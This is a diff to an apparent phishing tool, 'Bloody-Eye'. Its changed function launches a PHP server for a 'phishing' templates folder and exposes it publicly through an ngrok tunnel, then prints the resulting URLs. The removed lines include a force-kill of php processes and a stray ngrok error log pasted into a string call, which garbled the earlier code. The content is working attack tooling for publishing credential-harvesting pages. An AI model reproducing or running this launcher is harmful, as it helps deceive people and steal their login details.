@@ -543,21 +543,13 @@ exit();""")
     print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+" Ngorok.io")
     print("")
     def ngrokserver():
-       try:
-          with open("log","w") as phplog:
-             Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-          bannner.banner()
-          global token
-          a = ngrok.connect(6060,"http",auth_token=token)
-          print("\n"+Fore.RED+" [~] URL 1 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://").replace("-> https://localhost:6060",""))
-          print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060","").replace("""t=2021-10-21T09:58:10+0000 lvl=eror msg="session closed, starting reconnect loop" obj=csess id=87b217a4d209 err="read tcp [2a01:5ec0:d801:f9e:1:0:29ae:eeab]:59046->[2600:1f16:d83:1202::6e74:2]:443: read: software caused connection abort"
-t=2021-10-21T09:58:10+0000 lvl=eror msg="failed to reconnect session" obj=csess id=87b217a4d209 err="dial tcp: lookup tunnel.us.ngrok.com on 213.186.33.99:53: dial udp 213.186.33.99:53: connect: network is unreachable""",""))
-       except:
-          print ("ch")
-          with open("exit","w") as kill:
-             Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
-          os.system("clear")
-          sys.exit()
+       with open("log","w") as phplog:
+          Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
+       bannner.banner()
+       global token
+       a = ngrok.connect(6060,"http",auth_token=token)
+       print("\n"+Fore.RED+" [~] URL 1 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://").replace("-> https://localhost:6060",""))
+       print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060",""))
          
     
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
